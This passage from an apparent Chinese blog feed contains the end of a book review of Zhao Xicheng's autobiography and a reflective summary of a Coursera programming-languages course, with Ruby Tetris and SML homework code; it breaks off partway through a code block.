title="少年时期"></a>少年时期</h2><p>赵博士生于1927年，进入少年时期后，国内的大环境就一直不太平。先是抗日战争，家乡被摧毁，少年的他只能跟随父母过着颠簸流离的生活。但是在当年如此艰苦的条件下，他的父亲以仁先生还不忘子女的教育问题，在那么艰难的条件下还是想法设法托人帮他在上海入学，在这点上就能体会出以仁先生的远见和卓识。他在少年时期虽然条件艰苦，但还是认真努力学习，并且在校园内充分发挥了他的社交能力和运动天赋，这几点也非常重要。社交能力能够为他将来的事业腾飞建立起良好的基础，而运动天赋一方面能够帮助他提升自己的影响力和领导力，另一方面能够为他的健康体魄打下坚实的基础，至今赵博士已经93岁高龄了，作息非常规律，并且身体仍然非常健康，这是非常难能可贵的。对于这点的体会是深有体会，不管任何时候，人活在世上一个健康的体魄才是所有的幸福的基础，没有健康便没有一切，这也是我们需要亲自传授给自己的后代的。作息规律，坚持运动，凡是做好计划和安排，这是人这辈子能够有所成就，事业能够取得成功的基础。</p><p>书中描写了他在内乱时期下享受的宁静的校园时光，像每个少年一样，充满朝气和活力，急不可耐的想证明自己。父亲早早就为赵锡成做好了规划，要求他能够从事技术行业，这样可以不依靠自己的家庭背景也能够依靠自己的技术有所成就。</p><h2 id="青年时期"><a href="#青年时期" class="headerlink" title="青年时期"></a>青年时期</h2><p>青年时期的赵锡成是充满活力和朝气，在青年时期发生了几件非常重要的事情，一是他学业有成，以优异的成绩考入上海交通大学；二是他遇到了自己这一生的伴侣朱木兰；三是因为内战的原因他辗转到了台湾，与父亲成了永久的别离。</p><p>在学业上，他还是一如既往的优秀，努力奋斗，以优异的成绩毕业于上海吴淞船运专科学校，即上海海事大学的前身，而后以非常巧合的机会进入”太平轮”从实习生干起，并且以第一名的成绩通过了船长的资格考试，青年时期的奋斗为他后来的事业奠定了良好的基础。</p><p>在爱情上，他对朱木兰一见倾心，书中用了很大的篇幅来描写赵博士与朱木兰女士的爱情故事，可以看得出赵博士对朱木兰女士的深情。赵博士本来与朱木兰在上海相识，朱木兰的家族显赫，在当时的明国时期也称得上为精英阶层了。因为内战的原因，一度认为他们这辈子可能永远不会再相见了，却没想到赵锡成也因此辗转到了台湾，他还是满心的期待能够与朱木兰女生再度重逢，经过他的不泄努力，终于意外的跟朱木兰女士又重逢了，而后依靠自己的努力终于与朱木兰女士结成正果了，而他也忙于沉浸在新组建的家庭的幸福中。</p><p>在家庭上，因为内战的原因，他所工作的轮船直接离开了大陆辗转到了台湾，而他也因此滞留台湾，而这确是他这辈子最大的遗憾，因为从此他与父母分离，直到中美恢复外交后，他才有机会将母亲接到了美国。书中描写的赵博士最大遗憾就是赵博士的父亲以仁先生因为在文革时期受到牵连，而受到很多折磨，因病去世。直到他在美国定居了以后，他才将母亲接到美国居住，而他的母亲却不幸的是很快在一年多就去世了，我想作为子女，不能赡养父母，不能让父母安享晚年，可能就是做子女的最大的遗憾吧，而后也要多想想自己的路，多为自己的老父亲考虑考虑。</p><h2 id="中年时期"><a href="#中年时期" class="headerlink" title="中年时期"></a>中年时期</h2><p>中年时期我想更是赵博士的努力奋斗，实现所谓的“American Dream”的时期。依然只身一人放弃安稳的工作，远离家乡，远离自己心爱的妻子和家中的幼子，为了自己的理想到当时的美国从头开始奋斗。书中描写了他在美国时期的艰苦条件，经济上捉襟见肘，身份上处处受到歧视，学业上也有卓多不顺，但是这些困难都被赵博士一一克服，他的乐观、勤奋和坚持的精神永远都值得我们学习。</p><p>由于放弃了安稳的工作，他一方面为了完成学业，一方面为了能够在美国立足，除了学业之外基本上都是兼职了三份工作，周末就在中国餐馆里面打工，平时在船运工作做兼职。书中不光描写了当时他面临的困境，也描写了他当时积极乐观的心境，我想他能够积极乐观的度过困境也与家庭的支撑有关，毕竟远方有自己心爱的爱人和子女，为之努力奋斗也更有动力了，正所谓古人说的”成家立业”，家庭永远是坚强的后方。而正是因为他积累的良好的社交关系，他在餐馆打工时巧遇中国招商局驻美的官员，而这为他日后事业的腾飞提供了契机，这也给了我们很多启发，良好的人际关系总能够在某些关键时刻给予极大的帮助，所以“但行好事，莫问前程”，发自内心的积极帮助他人，总能跟你带来不少意外的收获。而后期他终于在美国立足后，将全家都接到了美国，正式开启了他的“American Dream”之路。</p><p>因为当时他到美国时，刚好处于严重的排华时期，他因为自己身份的问题，不能通过正常途径入学，只能以旁听生的身份选修课程，而这种境况下，导致他迟迟不能拿到正规的学位，他最终到处托关系，终于拿到了哥伦比亚大学的正规学位，在逆境中永不轻言放弃，这是一个成功的领导者需要具备的基本素质。</p><p>正因为他踏实肯干，能干的良好口碑为他后期创立福茂奠定了良好的基础，由香港和台湾的几个富商股东，再加上赵锡成联合成立了“福茂”，而他作为具体的执行董事，以他的聪明才干将福茂打理的仅仅有条，有声有色。而在船运低谷期，几个股东都因为年事过大，准备将股份全部转让出去，而顺利成章的，赵博士接手了“福茂”航运公司，而“福茂”正式在赵锡成的带领下，渐渐走上正规。书中描写的最多的他在企业经营中的稳重和用人之道，在企业经营理念上他大胆创新，敢于冒险，敢于吃螃蟹，成为第一个在中国委托造船的外资企业。在航运低谷时期不气馁，坚持守业，用合理的利润与合作伙伴共度难关；在航运高峰期不傲娇，不盲目扩张，不盲目涨价，诚实守信，稳扎稳打。在用人理念上，应该属于传统的儒商，“德才兼备，先德后才”的用人理念，使得福茂能够拥有一批精兵强将，在造船和运营上都严守标准，企业的发展关键在于人才，吸引合适的人才一直是企业的重中之重。</p><h2 id="老年时期"><a href="#老年时期" class="headerlink" title="老年时期"></a>老年时期</h2><p>老年时期，我想最多的应该是他的收获期，收获不仅仅是事业，还有幸福的家庭。</p><p>事业上不断的发展，使得他在政界和商界上都获得巨大的成功，都非常具有影响力。在美国他加入了船业协会，作为名副其实的“船王”。通过和中国的“船务”贸易，多次受到领导人的接见，与交通部门关系良好。在美国由于其女赵小兰女士在政界的影响力，他经常能够接见美国上层的精英阶层，与历任总统都有结交，他积极投身于慈善事业，在哈佛大学捐赠成立赵朱木兰中心，在上海交通大学捐赠成立木兰楼，在政界和商界积累了良好的人脉和口碑，可谓称得上在美国最成功的华裔之一。本书中可以简单又许多中国和美国的政要为本书作序，后记中可以看到美国几任总统为其颁发的贺信，其中有布什总统、奥巴马总统、克林顿总统，足以可见他在政界和商界的影响力。</p><p>家庭上也是收获满满，几个子女中除了有个女儿意外去世外，都是成功世家的典范，妥妥的人生赢家。几个女儿都毕业于美国著名的大学。最出名的是大女儿赵小兰成为第一位入阁的华裔，担任克林顿总统时期的交通部部长，后又担任劳工部部长，足以见的其优秀的才能和品质。小女儿安吉继承了父亲的家业，能够继续在商业发扬光大。最可惜的朱木兰女士在73岁的时候去世，无疑爱人的去世是对他最大的打击，但他后来还是继续振作起来，自律勤奋的生活。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于自己来说，非常喜欢这类励志的书籍，当然每个成功的人士背后都有不少心酸的故事，我想从书中不光可以学习到他们优秀的品质和做人的道理，更重要的是想学习和感悟到他们在面对逆境时如何度过危机和困难。人的一生很长，难免遇到起起伏伏，但是能够像赵锡成这样一路向上，安享晚年，家庭和事业，健康都非常成功的少见，我们作为后备看书学习，更多的是领悟到了什么，正如本书的标题中提到的，人生并不是一帆风顺的，要努力做到逆风无畏。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;逆风无畏&quot;&gt;&lt;a href=&quot;#逆风无畏&quot; class=&quot;headerlink&quot; title=&quot;逆风无畏&quot;&gt;&lt;/a&gt;逆风无畏&lt;/h1&gt;&lt;p&gt;不知不觉花了大概两个星期把《逆风无畏》这本书看完了，本书主要讲述的是福茂集团董事长赵锡成博士的自传。为什么突然想到这本自传了，因为美国政坛最耀眼的华裔莫过于赵小兰女士了，赵博士即为赵小兰的父亲，其实当初买这本书也想探究一下，为什么这个普通的华裔家庭能够培养出来这么多优秀的后代，赵锡成的几个女儿也都非常的出色，可以算是美国顶尖的精英阶层了，我想能够透过赵博士的自传对他的人生观，价值观，教育理想可以了解和学习一下，能够对自身有所收获和学习，不光是做人的道理，更是教育后代的理念和方法。&lt;br&gt;当然总的来说赵锡成博士作为经历过民国时期传统文化教育的人士，他的许多人生理念和教育观念都非常偏向于东方传统的教育观念和道德观念，特别是提到的他对于商业管理的看法，对于公司管理的看法，重于人性而轻于理性，应用传统的管理理念在现代企业治理中也取得了成功。他的传统的教育理念，比如严谨严苛的教育观念，而不是典型的西方那种自由散漫式的教育，他的几个子女也都取得了非常不俗的成就，这些都是值得我们吸收和学习的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="读书" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读后感" scheme="http://yoursite.com/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title>【Coursera】 Programming Languages PARTc</title>
    <link href="http://yoursite.com/2020/11/01/219/"/>
    <id>http://yoursite.com/2020/11/01/219/</id>
    <published>2020-11-01T15:18:39.763Z</published>
    <updated>2020-11-01T15:18:39.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id="programming-languages-PARTC-总结"><a href="#programming-languages-PARTC-总结" class="headerlink" title="programming languages PARTC 总结"></a>programming languages PARTC 总结</h1><p>终于完成了<code>UWL</code>的<code>programming languages</code>的系列课程和<code>project</code>.感觉<code>part3</code>部分没有前两部分有意思，这部分主要讲的<code>object Oriented programming</code>，没有前两章的<code>functional programming</code>有意思，不过课后的<code>project</code>还是一如既往的有深度，有思考的地方，硬着头皮把两个<code>project</code>完成了，其实学习<code>coursera</code>课程，最满意的就是它的<code>project</code>了，非常有难度和深入思考的地方。后面准备尝试下<code>mit</code>和<code>cmu</code>的公开课课程，听说这些著名大学的<code>lab</code>都是非常的难，非常期待这种有难度和深入思考的<code>lab</code>.</p><a id="more"></a><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="课程"><a href="#课程" class="headerlink" title="课程"></a>课程</h3><p><code>week1</code>中主要讲述了<code>ruby</code>的基本语言特性和用法，仔细发现<code>ruby</code>跟<code>python</code>感觉非常像，好多语法和关键字跟<code>python</code>几乎是一模一样，感觉<code>python</code>的很多语言特性应该是借鉴了<code>ruby</code>的，其中印象比较深刻的就是<code>ruby</code>的<code>blocks</code>，感觉跟<code>sml</code>的<code>map</code>很像。但是感觉<code>ruby</code>的门槛太高了，语法入门级简单，但是用好这个语言的高级语法比较难，这个语言语法感觉太过于灵活，反而让人无所适从，写代码可以写起来非常爽，基本上一行代码可以抽象出非常多的高级功能，但是正是因为语法过于灵活，高级特性过于繁杂，反而要求对于程序猿的素质过高，在大型项目中，就容易出问题。很多代码在随意使用高级特性的情况下，导致大量的代码无法维护。现在综合来看，还是<code>java</code>,<code>C/C++</code>这种强制类型语言适合构建大型项目，语法简单单一，容易掌握，代码结果和方式容易统一，最终写出来的代码一致性和可维护性好，还是不错的。</p><h3 id="project"><a href="#project" class="headerlink" title="project"></a>project</h3><p><code>week1</code>的<code>project</code>主要是用<code>ruby</code>的<code>oop</code>的特性，但是总感觉<code>ruby</code>的<code>oop</code>的部分处理过于灵活，规则过于简单，子类可以随意替换父类，感觉比较混乱，如果利用<code>ruby</code>来构建大型项目，非常容易出现一些稀奇古怪的问题，感觉还是要利用<code>java</code>这种强类型且严谨的语言构建大型项目。本周的<code>project</code>为俄罗斯方块游戏增加部分功能。难点在于需要对<code>store_current</code>函数进行重载，否则就会报错。<code>project</code>最终以满分通过，还是非常有成就感的。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># University of Washington, Programming Languages, Homework 6, hw6runner.rb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the only file you turn in, so do not modify the other files as</span></span><br><span class="line"><span class="comment"># part of your solution.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPiece</span> &lt; Piece</span></span><br><span class="line">  <span class="comment"># The constant All_My_Pieces should be declared here</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span> <span class="params">(point_array, board)</span></span></span><br><span class="line">    <span class="keyword">super</span>(point_array, board)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># your enhancements here</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">self</span>.<span class="title">next_piece</span> <span class="params">(board)</span></span></span><br><span class="line">    MyPiece.new(All_My_Pieces.sample, board)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># cheat piece for game</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">self</span>.<span class="title">cheat_piece</span><span class="params">(board)</span></span></span><br><span class="line">    MyPiece.new(ALL_CHEAT_Pieces.sample, board)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># class array holding all the pieces and their rotations</span></span><br><span class="line">  All_My_Pieces = [[[[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>]]],  <span class="comment"># square (only needs one)</span></span><br><span class="line">                rotations([[<span class="number">0</span>, <span class="number">0</span>], [-<span class="number">1</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>]]), <span class="comment"># T</span></span><br><span class="line">                [[[<span class="number">0</span>, <span class="number">0</span>], [-<span class="number">1</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">2</span>, <span class="number">0</span>]], <span class="comment"># long (only needs two)</span></span><br><span class="line">                [[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>]]],</span><br><span class="line">                rotations([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>]]), <span class="comment"># L</span></span><br><span class="line">                rotations([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], [-<span class="number">1</span>, <span class="number">1</span>]]), <span class="comment"># inverted L</span></span><br><span class="line">                rotations([[<span class="number">0</span>, <span class="number">0</span>], [-<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">1</span>, -<span class="number">1</span>]]), <span class="comment"># S</span></span><br><span class="line">                rotations([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [-<span class="number">1</span>, -<span class="number">1</span>]]), <span class="comment"># Z</span></span><br><span class="line">                rotations([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">0</span>]]),</span><br><span class="line">                [[[<span class="number">0</span>, <span class="number">0</span>], [-<span class="number">1</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">2</span>, <span class="number">0</span>] ,[-<span class="number">2</span>,<span class="number">0</span>]], <span class="comment"># long (only needs two)</span></span><br><span class="line">                [[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, -<span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>], [<span class="number">0</span>,-<span class="number">2</span>]]],</span><br><span class="line">                rotations([[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]])]</span><br><span class="line">  ALL_CHEAT_Pieces = [[[[<span class="number">0</span>,<span class="number">0</span>]]]]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyBoard</span> &lt; Board</span></span><br><span class="line">  <span class="comment"># your enhancements here</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(game)</span></span></span><br><span class="line">    @grid = Array.new(num_rows) &#123;Array.new(num_columns)&#125;</span><br><span class="line">    @current_block = MyPiece.next_piece(<span class="keyword">self</span>)</span><br><span class="line">    @score = <span class="number">0</span></span><br><span class="line">    @game = game</span><br><span class="line">    @delay = <span class="number">500</span></span><br><span class="line">    @cheat = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># moves the current piece left if possible</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">rotate_cycle</span></span></span><br><span class="line">    rotate_clockwise</span><br><span class="line">    rotate_clockwise</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">cheat_once</span></span></span><br><span class="line">    <span class="keyword">if</span> @score &gt;= <span class="number">100</span></span><br><span class="line">      @cheat = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">store_current</span></span></span><br><span class="line">    locations = @current_block.current_rotation</span><br><span class="line">    displacement = @current_block.position</span><br><span class="line">    (<span class="number">0</span>..(locations.size-<span class="number">1</span>)).each&#123;<span class="params">|index|</span> </span><br><span class="line">      current = locations[index];</span><br><span class="line">      @grid[current[<span class="number">1</span>]+displacement[<span class="number">1</span>]][current[<span class="number">0</span>]+displacement[<span class="number">0</span>]] = </span><br><span class="line">      @current_pos[index]</span><br><span class="line">    &#125;</span><br><span class="line">    remove_filled</span><br><span class="line">    @delay = [@delay - <span class="number">2</span>, <span class="number">80</span>].max</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">next_piece</span></span></span><br><span class="line">    <span class="keyword">if</span> @cheat</span><br><span class="line">      @score = @score - <span class="number">100</span></span><br><span class="line">      @current_block = MyPiece.cheat_piece(<span class="keyword">self</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      @current_block = MyPiece.next_piece(<span class="keyword">self</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    @current_pos = <span class="literal">nil</span></span><br><span class="line">    @cheat = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTetris</span> &lt; Tetris</span></span><br><span class="line">  <span class="comment"># your enhancements here</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></span><br><span class="line">    <span class="keyword">super</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># creates a canvas and the board that interacts with it</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">set_board</span></span></span><br><span class="line">    @canvas = TetrisCanvas.new</span><br><span class="line">    @board = MyBoard.new(<span class="keyword">self</span>)</span><br><span class="line">    @canvas.place(@board.block_size * @board.num_rows + <span class="number">3</span>,</span><br><span class="line">                  @board.block_size * @board.num_columns + <span class="number">6</span>, <span class="number">24</span>, <span class="number">80</span>)</span><br><span class="line">    @board.draw</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">key_bindings</span></span></span><br><span class="line">    <span class="keyword">super</span></span><br><span class="line">    @root.bind(<span class="string">'u'</span>, proc &#123;@board.rotate_cycle&#125;)</span><br><span class="line">    @root.bind(<span class="string">'c'</span>, proc &#123;@board.cheat_once&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><p>该部分主要讲述了面向对象编程的思想和技巧，特别里面重要概念<code>dynamic dispatch</code>，动态匹配，这个思想非常深刻，里面的技巧感觉讲的非常好，如何设计类，如何利用类<code>dispath</code>来匹配所有的<code>case</code>操作，令人耳目一新。最后的作业也是主要讲述该部分，还是非常的有意思。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p><code>sml</code>语言还是一如既往的强大，非常喜欢这类学术化的语言，适合教学最好，因为语言特性够纯粹，感觉也只有国外的教授喜欢做这种吃力不讨好的事情吧。<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fun</span> shift (dx,dy,e) = </span><br><span class="line"><span class="keyword">case</span> e <span class="keyword">of</span></span><br><span class="line"><span class="type">NoPoints</span> =&gt; e <span class="comment">(* first 5 cases are all values, so no computation *)</span></span><br><span class="line">  | <span class="type">Point</span> (x,y)  =&gt; <span class="type">Point</span> (x + dx,y + dy)</span><br><span class="line">  | <span class="type">Line</span> (m,b)   =&gt; <span class="type">Line</span> (m, b + dy - m*dx)</span><br><span class="line">  | <span class="type">VerticalLine</span> (x) =&gt; <span class="type">VerticalLine</span> (x + dx)</span><br><span class="line">  | <span class="type">LineSegment</span> (x1,y1,x2,y2)  =&gt; <span class="type">LineSegment</span> (x1+dx,y1+dy,x2+dx,y2+dy)</span><br><span class="line">  | _ =&gt; e</span><br><span class="line"></span><br><span class="line"><span class="keyword">fun</span> eval_prog (e,env) =</span><br><span class="line">    <span class="keyword">case</span> e <span class="keyword">of</span></span><br><span class="line"><span class="type">NoPoints</span> =&gt; e <span class="comment">(* first 5 cases are all values, so no computation *)</span></span><br><span class="line">      | <span class="type">Point</span> _  =&gt; e</span><br><span class="line">      | <span class="type">Line</span> _   =&gt; e</span><br><span class="line">      | <span class="type">VerticalLine</span> _ =&gt; e</span><br><span class="line">      | <span class="type">LineSegment</span> _  =&gt; e</span><br><span class="line">      | <span class="type">Var</span> s =&gt; </span><br><span class="line">(<span class="keyword">case</span> <span class="type">List</span>.find (<span class="keyword">fn</span> (s2,v) =&gt; s=s2) env <span class="keyword">of</span></span><br><span class="line"><span class="type">NONE</span> =&gt; <span class="keyword">raise</span> <span class="type">BadProgram</span>(<span class="string">"var not found: "</span> ^ s)</span><br><span class="line">| <span class="type">SOME</span> (_,v) =&gt; v)</span><br><span class="line">      | <span class="type">Let</span>(s,e1,e2) =&gt; eval_prog (e2, ((s, eval_prog(e1,env)) :: env))</span><br><span class="line">      | <span class="type">Intersect</span>(e1,e2) =&gt; intersect(eval_prog(e1,env), eval_prog(e2, env))</span><br><span class="line">  | <span class="type">Shift</span>(dx,dy,e1)  =&gt; shift(dx,dy,eval_prog(e1,env))</span><br><span class="line"></span><br><span class="line"><span class="comment">(* CHANGE: Add function preprocess_prog of type geom_exp -&gt; geom_exp *)</span></span><br><span class="line"><span class="keyword">fun</span> preprocess_prog(e) = </span><br><span class="line"><span class="keyword">case</span> e <span class="keyword">of</span></span><br><span class="line">      <span class="type">LineSegment</span> (x1,y1,x2,y2)  =&gt;  (<span class="keyword">if</span> real_close_point (x1,y1) (x2,y2)</span><br><span class="line"><span class="keyword">then</span> <span class="type">Point</span>(x1,y1)</span><br><span class="line"><span class="keyword">else</span> (<span class="keyword">if</span> real_close(x1,x2)</span><br><span class="line">  <span class="keyword">then</span> (<span class="keyword">if</span> y1 &lt; y2</span><br><span class="line"><span class="keyword">then</span> <span class="type">LineSegment</span>(x1,y1,x2,y2)</span><br><span class="line"><span class="keyword">else</span> <span class="type">LineSegment</span>(x2,y2,x1,y1))</span><br><span class="line">  <span class="keyword">else</span> (<span class="keyword">if</span> x1 &lt; x2</span><br><span class="line"><span class="keyword">then</span> <span class="type">LineSegment</span>(x1,y1,x2,y2)</span><br><span class="line"><span class="keyword">else</span> <span class="type">LineSegment</span>(x2,y2,x1,y1))))</span><br><span class="line">  | <span class="type">Intersect</span>(e1,e2) =&gt; <span class="type">Intersect</span>(preprocess_prog(e1),preprocess_prog(e2))</span><br><span class="line">  | <span class="type">Let</span>(s,e1,e2) =&gt; <span class="type">Let</span>(s,preprocess_prog(e1),preprocess_prog(e2))</span><br><span class="line">      | <span class="type">Shift</span>(dx,dy,e) =&gt; <span class="type">Shift</span>(dx,dy,preprocess_prog(e))</span><br><span class="line">  | _ =&gt; e</span><br></pre></td></tr></table></figure><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 